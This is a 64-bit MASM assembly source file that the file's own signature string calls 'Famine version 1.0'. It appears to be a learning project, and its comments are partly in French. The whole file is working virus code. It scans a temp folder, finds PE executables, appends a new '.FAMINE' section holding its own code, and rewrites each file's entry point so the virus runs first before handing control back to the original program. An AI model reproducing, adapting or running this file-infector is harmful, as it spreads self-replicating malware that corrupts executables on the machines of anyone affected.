;-----------------------------------
;Descr  : My First 64-bit MASM program
;ml64 prog.asm /c
;golink /console /entry main prog.obj msvcrt.dll, or
;gcc -m64 prog.obj -o prog.exe (main/ret). This needs 64-bit GCC.
;-----------------------------------

includelib libcmt.lib
includelib kernel32.lib
includelib ntdll.lib

extrn puts:proc
extrn printf:proc

extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn memset:proc
extrn strncat:proc
extrn strncpy:proc
extrn ReadFile:proc
extrn CreateFileA:proc
extrn memcpy:proc
extrn malloc:proc
extrn GetFileSize:proc
extrn SetFilePointer:proc
extrn WriteFile:proc
extrn NtCreateFile:proc
.code

; rbp
; 40-48 : alignment
; 32-40 : av[0]
; 00-32 : shadow space
; rsp 

label_debut:

debut_main:
main proc

		push rbp
		mov rbp, rsp

		push RAX
		push RBX
		push RCX
		push RDX
		push RSI
		push RDI
		push R8 
		push R9 
		push R10
		push R11
		push R12
		push R13
		push R14
		push R15

		sub	rsp, 48
		or rsp, 0fh
		inc rsp
		sub rsp, 010h

		mov rcx, [rdx]
		mov [rsp + 32], rcx

	 	call NtCreateFile

		lea rcx, TMP_1
		call infect_folder
		mov rdx, label_fin
		mov rcx, label_debut
		sub rdx, rcx
;		lea rcx, print_ptr
;		call printf

		add rsp, 48 

		pop R15
		pop R14
		pop R13
		pop R12
		pop R11
		pop R10
		pop R9 
		pop R8 
		pop RDI
		pop RSI
		pop RDX
		pop RCX
		pop RBX
		pop RAX
		
		test BYTE ptr [MUST_EXIT], 1
		jne stop

		call qword ptr [ENTRY_POINT]

stop:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
main endp
fin_main:

MUST_EXIT db 1
ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
SECTION_NAME db '.FAMINE',0

; rbp
; 60 - 64	: size_of_main 
; 56 - 60	: Addresse virtuelle de notre code
; 48 - 56	: nbr of bytes read 
; 40 - 48	: malloc
; 32 - 40	: params
; 00 - 32	: shadow
; rsp

; r12 : handle
; r13 : fileSize
; r14 : taille de notre code
; r15 : Optianl Header address

handle_file proc ; int handle
	push rbp
	mov rbp, rsp
	sub rsp, 64

	mov r12, rcx
	mov rcx, r12
	mov rdx, 0 
	call GetFileSize

	mov r13, rax ; r13 = taille du fichier

	mov rcx, label_fin
	mov rdx, label_debut
	sub rcx, rdx

	mov r14, rcx
	
	add rcx, rax 
	call malloc

	test rax, rax
	je ret_failure

	mov [rsp + 40], rax
	mov word ptr [rax], 5a4dh

	add rax, 2
	sub r13, 2

	mov rcx, r12
	mov rdx, rax
	mov r8, r13
	lea r9, [rsp + 48]
	mov qword ptr [rsp + 32], 0
	call ReadFile

	test rax, rax
	je ret_failure

	test r13, qword ptr [rsp+48]
	je ret_failure

	mov rax, qword ptr [rsp + 40]
	add rax, 3Ch
	xor rdx, rdx
	mov edx, dword ptr [rax] ; on saute le MS DOS header 

	mov rax, qword ptr [rsp + 40]
	add rax, rdx
	add rax, 6
	mov cx, word ptr [rax] ; cx = OldNumberOfSections
	inc word ptr [rax] ; NumberOfSections++
	add rax, 14

	xor rbx, rbx
	mov bx, word ptr [rax]
		mov r15, rax
		add r15, 4
	add rax, rbx
	add rax, 4 ;  ptr += SizeOfOptionaHeaders + 4

	xor rbx, rbx
	mov bx, cx
	mov rdx, rbx

		mov rbx, rax ; temp

	mov rax, 40
	imul rdx
	add rax, rbx ; rax += olDSizeOfOptionalHeaders

	mov rbx, qword ptr [SECTION_NAME]
	mov  [rax], rbx ; on met le nom de la section

	add rax, 8
	mov dword ptr [rax], r14d ; on met la taille de Famine

	add rax, 4
	mov rbx, rax
	sub rbx, 40
	mov r8d, dword ptr [rbx]
	mov r9d, dword ptr [rbx - 4]
	add r8d, r9d
	or r8d, 0fffh
	inc r8d
	mov dword ptr [rsp + 56], r8d
	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle

	add rax, 4
	mov rbx, r14
	or rbx, 0ffh
	inc rbx
	mov dword ptr [rax], ebx ; size of raw data

	add rax, 4
	add r13, 2
	mov dword ptr [rax], r13d ; Emplacement du code = taille du fichier

	add rax, 4
	mov qword ptr [rax], 0  ; PointerToReliocations and PointerToLineNumber

	add rax, 8
	mov dword ptr [rax], 0 ; NUmberOfRelocations and NumberOfLineNumber

	add rax, 4
	mov dword ptr [rax], 60000020h ; Characterisitcs

	mov rcx, [rsp + 40]
	add rcx, r13
	lea rdx, label_debut
	mov r8, r14
	call memcpy	 ; on ecrit notre code a la fin du buffer

	mov rcx, fin_main
	mov rdx, debut_main
	sub rcx, rdx
	mov dword ptr [rsp + 60], ecx ; On sauvegarde la taille du main

	mov rcx, [rsp + 40]
		add rcx, r13
		xor rbx, rbx
		mov ebx, dword ptr [rsp + 60]
	add rcx, rbx
	mov byte ptr [rcx], 0 ; on met MUST EXIT a 0

	add r15, 4
		mov rbx, r14
		or rbx, 0ffh
		inc rbx
	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe

	add r15, 12
	xor rbx, rbx
	mov ebx, dword ptr [r15]
	inc rcx
	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point

	mov rax, debut_main
	mov rbx, label_debut
	sub rax, rbx ; rax = label_debut - label_main = 0? 

	add rax, r13
	mov eax, dword ptr [rsp + 56]
	mov dword ptr [r15], eax ; on modifie l'entry point par notre main

	add r15, 40
	mov eax, dword ptr [rsp + 56]
	add eax, 01000h
	mov dword ptr [r15], eax ; Size of image


	mov rcx, r12
	mov rdx, 0
	mov r8, 0
	mov r9, 0
	call SetFilePointer

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, r13
	add r8, r14
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0
	call WriteFile

	mov rcx, [rsp + 40]
	mov rdx, 0
	mov r8, r14
	and	r8, 0ffh
	xor r8, 0ffh
	inc r8
		mov rbx, r8
	call memset

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, rbx
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0
	call WriteFile

ret_failure:
	mov rsp, rbp
	pop rbp
	ret
handle_file endp


; rbp
; 70 - 80		: padding
; 66 - 70		: number_of_bytes_read
; 64 - 66		:  Buffer
; 32 - 64		: params
; 00 - 32		: shadow
; rsp

open_file proc ; char *file_path - return fd or 0
	push rbp
	mov rbp, rsp
	sub rsp, 80
	
	xor rax, rax

	push rcx
	push 0
	call puts
	pop rcx
	pop rcx

	mov rdx, 0C0000000h ; Desired Access
	mov r8, 0 ; Share permission
	mov r9, 0 ; NULL
	mov rax, 3
	mov [rsp + 32], rax ; Open only if exists
	mov rax, 80h
	mov [rsp + 36], rax ; flag normal
	mov rax, 0
	mov [rsp + 40], rax ; no attribute template
	call CreateFileA
	
	mov r12, rax

	cmp rax, -1
	je ret_error


	mov rcx, r12
	lea rdx, [rsp + 64]
	mov r8, 2
	lea r9, [rsp + 66]
	mov rax, 0
	mov [rsp + 32], rax ; Open only if exists
	call ReadFile

	mov ax, word ptr [rsp + 64]
	cmp ax, 5a4dh
	je  ret_ok

ret_error:
	mov r12, -1
ret_ok:
	mov rax, r12
	mov rsp, rbp
	pop rbp
	ret
open_file endp

; rbp	
; 400-528	: path + file name
; 40-400	: structure WIN32_FIND_DATA dirent
; 32-40		: folder_name
; 00-32		: shadow
; rsp

infect_folder proc ; parametres : char *folder_name
		push rbp
		mov rbp, rsp
		sub	rsp, 528

		mov [rsp + 32], rcx

		mov rcx, [rsp + 32]
		lea rdx, [rsp + 40]
		call FindFirstFileA

		mov rsi, rax
loop_start:
		mov rcx, rsi
		lea rdx, [rsp + 40]
		call FindNextFileA

		cmp rax, 0
		je loop_end

		lea rcx, [rsp + 84]
		call puts

		lea rcx, [rsp + 400]
		lea rdx, TMP_1_NAME
		mov r8, 128
		call strncpy

		lea rcx, [rsp + 400]
		lea rdx, [rsp + 84]
		mov r8, 128
		call strncat

		lea rcx, [rsp + 400]
		call open_file

		cmp rax, -1
		je loop_start

		mov rcx, rax 
		call handle_file

		jmp loop_start
loop_end:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
infect_folder endp
label_fin:
end